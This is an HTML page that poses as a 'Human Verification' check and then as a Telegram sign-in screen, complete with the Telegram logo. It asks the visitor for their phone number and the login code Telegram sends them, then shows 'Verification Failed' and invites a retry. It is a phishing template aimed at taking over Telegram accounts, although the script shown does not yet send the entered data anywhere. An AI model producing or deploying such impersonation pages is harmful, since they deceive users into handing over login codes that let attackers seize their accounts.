<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Human Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap');
        body {
            font-family: 'Open Sans', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            height: 100vh;
            background-color: #111827;
            overflow: hidden;
        }

        .verification-container {
            text-align: center;
            padding-top: 20px;
            background-color: #111827;
            width: 100%;
            max-width: 500px;
        }

        .verification-container h1 {
            font-size: 28px;
            color: #FFFFFF;
            margin-bottom: 20px;
            font-weight: 600;
            margin-top: 0;
        }

        .verification-container p {
            font-size: 16px;
            color: #E5E7EB;
            margin-bottom: 40px;
        }

        .verification-container button {
            font-size: 20px;
            font-weight: 600;
            color: #FFFFFF;
            background-color: #2F855A;
            border: none;
            border-radius: 8px;
            padding: 15px 0;
            cursor: pointer;
            transition: background-color 0.3s;
            width: 100%;
            max-width: 400px;
            background: linear-gradient(135deg, #3B806F, #2F855A);
        }

        .verification-container button:hover {
            background-color: #276749;
        }

        .container {
            text-align: center;
            width: 90%;
            max-width: 380px;
            position: relative;
            border-radius: 20px;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            display: none;
            background-color: #ffffff;
            height: 100vh;
            overflow-y: scroll;
        }

        .container img {
            width: 80px;
            margin-bottom: 20px;
            border-radius: 50%;
        }

        h1 {
            font-size: 20px;
            color: #333333;
            margin-bottom: 10px;
            font-weight: 600;
        }

        p {
            font-size: 14px;
            color: #777777;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
            position: relative;
        }

        .input-group label {
            display: block;
            font-size: 12px;
            color: #555555;
            margin-bottom: 5px;
        }

        select, input[type="tel"], .dropdown {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 12px;
            font-size: 16px;
            box-sizing: border-box;
            margin-bottom: 10px;
            background-color: #ffffff;
            color: #333333;
            transition: all 0.2s ease;
        }

        select:focus, input[type="tel"]:focus, .dropdown:hover {
            border-color: #0088cc;
            outline: none;
            box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.2);
        }

        .dropdown-container {
            position: relative;
        }

        .dropdown {
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            font-size: 16px;
            margin-bottom: 10px;
            background-color: #ffffff;
            color: #333333;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 12px;
            height: 42px;
        }

        .dropdown span {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
        }

        .dropdown .flag {
            display: none;
        }

        .dropdown .country-name {
            flex-grow: 1;
            text-align: left;
        }

        .dropdown .country-code {
            display: none;
        }

        .dropdown-menu {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background-color: #ffffff;
            border: 1px solid #ccc;
            border-radius: 12px;
            max-height: 300px;
            overflow-y: auto;
            z-index: 1000;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            animation: fadeIn 0.2s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .dropdown-menu.show {
            display: block;
        }

        .dropdown-item {
            padding: 10px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            color: #333333;
            transition: background-color 0.2s ease;
            border-bottom: 1px solid #eee;
        }

        .dropdown-item:last-child {
            border-bottom: none;
        }

        .dropdown-item img {
            width: 30px;
            height: 20px;
            object-fit: cover;
            margin-right: 10px;
        }

        .dropdown-item span {
            display: flex;
            align-items: center;
        }

        .dropdown-item span .country-name {
            margin-right: 10px;
        }

        .dropdown-item span .country-code {
            font-weight: bold;
        }

        .dropdown-item:hover {
            background-color: #f5f5f5;
        }

        .button {
            width: 100%;
            padding: 12px;
            background-color: #0088cc;
            color: #ffffff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            font-weight: 600;
            transition: background-color 0.2s ease;
        }

        .button:hover {
            background-color: #007ab8;
        }

        @media (max-width: 600px) {
            .verification-container {
                margin-top: 2cm; /* Move verification container 2cm from top on mobile */
            }

            .container {
                width: 95%;
                max-width: 340px;
                height: calc(100vh - 4cm); /* Adjust height on mobile */
                margin-top: 0; /* Adjust margin for full-screen fit */
            }

            .verification-container button {
                max-width: 80%;
            }
        }
    </style>
</head>
<body>
    <div class="verification-container" id="verificationContainer">
        <h1>Human Verification</h1>
        <p>Verify below to be granted entry</p>
        <button onclick="startSignIn()">Click here</button>
    </div>

    <div class="container" id="initialContainer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
        <h1>Sign in to Telegram</h1>
        <p>Please confirm your country code and enter your phone number.</p>

        <div class="input-group dropdown-container">
            <label for="countryCode">Country</label>
            <div id="countryCode" class="dropdown" onclick="toggleDropdown()">
                <span><span class="country-name"></span></span>
            </div>
            <div id="dropdownMenu" class="dropdown-menu"></div>
        </div>

        <div class="input-group">
            <label for="phoneNumber">Phone Number</label>
            <input type="tel" id="phoneNumber" inputmode="numeric" pattern="[0-9]*" placeholder="Phone Number" onfocus="scrollAwayKeyboard()">
        </div>

        <div>
            <input type="checkbox" id="keepSignedIn">
            <label for="keepSignedIn" style="color: #333333;">Keep me signed in</label>
        </div>

        <button class="button" onclick="goToVerificationPage()">Next</button>
    </div>

    <div class="container" id="phoneVerificationContainer" style="display:none;">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/69/Monkey_emoji.png" alt="Monkey Icon" style="width: 80px; margin-bottom: 20px; border-radius: 50%;">
        <h1 id="phoneDisplay"></h1>
        <p>We have sent you a message in Telegram with the code.</p>

        <div class="input-group">
            <label for="verificationCode">Code</label>
            <input type="tel" id="verificationCode" inputmode="numeric" pattern="[0-9]*" placeholder="Code">
        </div>

        <button class="button" onclick="submitVerification()">Submit</button>
    </div>

    <div class="container" id="finalMessageContainer" style="display:none;">
        <h1>Verification Failed</h1>
        <p id="finalMessage"></p>
        <button class="button" onclick="resetForm()">Try Again</button>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const countryDropdown = document.getElementById('countryCode');
            const dropdownMenu = document.getElementById('dropdownMenu');
            const phoneNumberInput = document.getElementById('phoneNumber');
            const countryNameSpan = countryDropdown.querySelector('.country-name');

            const countries = [
                { name: 'Australia', code: '+61', flag: 'ðŸ‡¦ðŸ‡º' },
                { name: 'United States', code: '+1', flag: 'ðŸ‡ºðŸ‡¸' },
                { name: 'United Kingdom', code: '+44', flag: 'ðŸ‡¬ðŸ‡§' },
                { name: 'Germany', code: '+49', flag: 'ðŸ‡©ðŸ‡ª' },
                { name: 'Russia', code: '+7', flag: 'ðŸ‡·ðŸ‡º' },
                { name: 'Brazil', code: '+55', flag: 'ðŸ‡§ðŸ‡·' },
                // Add more countries as needed
            ];

            countries.forEach(country => {
                const item = document.createElement('div');
                item.classList.add('dropdown-item');
                item.innerHTML = `<span>${country.flag} ${country.name}</span> <span class="country-code">${country.code}</span>`;
                item.dataset.code = country.code;
                item.dataset.flag = country.flag;
                item.dataset.name = country.name;
                item.addEventListener('click', function() {
                    countryNameSpan.textContent = country.name;
                    phoneNumberInput.value = country.code + ' ';
                    dropdownMenu.classList.remove('show');
                });
                dropdownMenu.appendChild(item);
            });

            window.toggleDropdown = function() {
                dropdownMenu.classList.toggle('show');
            };

            window.startSignIn = function() {
                setTimeout(function() {
                    document.getElementById('verificationContainer').style.display = 'none';
                    document.body.style.backgroundColor = "#ffffff";
                    document.getElementById('initialContainer').style.display = 'block';
                }, 500);
            }

            window.goToVerificationPage = function() {
                const phoneNumber = phoneNumberInput.value;
                if (phoneNumber === '') {
                    alert('Please enter your phone number.');
                    return;
                }

                document.getElementById('phoneDisplay').textContent = phoneNumber;
                document.getElementById('initialContainer').style.display = 'none';
                document.getElementById('phoneVerificationContainer').style.display = 'block';
            };

            window.submitVerification = function() {
                const verificationCode = document.getElementById('verificationCode').value;
                if (verificationCode === '') {
                    alert('Please enter the verification code.');
                    return;
                }

                document.getElementById('phoneVerificationContainer').style.display = 'none';
                document.getElementById('finalMessageContainer').style.display = 'block';
            };

            window.resetForm = function() {
                phoneNumberInput.value = '';
                document.getElementById('verificationCode').value = '';
                document.getElementById('finalMessageContainer').style.display = 'none';
                document.getElementById('initialContainer').style.display = 'block';
            };

            window.scrollAwayKeyboard = function() {
                document.activeElement.blur();
            }

            document.body.addEventListener('touchmove', function() {
                document.activeElement.blur();
            });
        });
    </script>
</body>
</html>
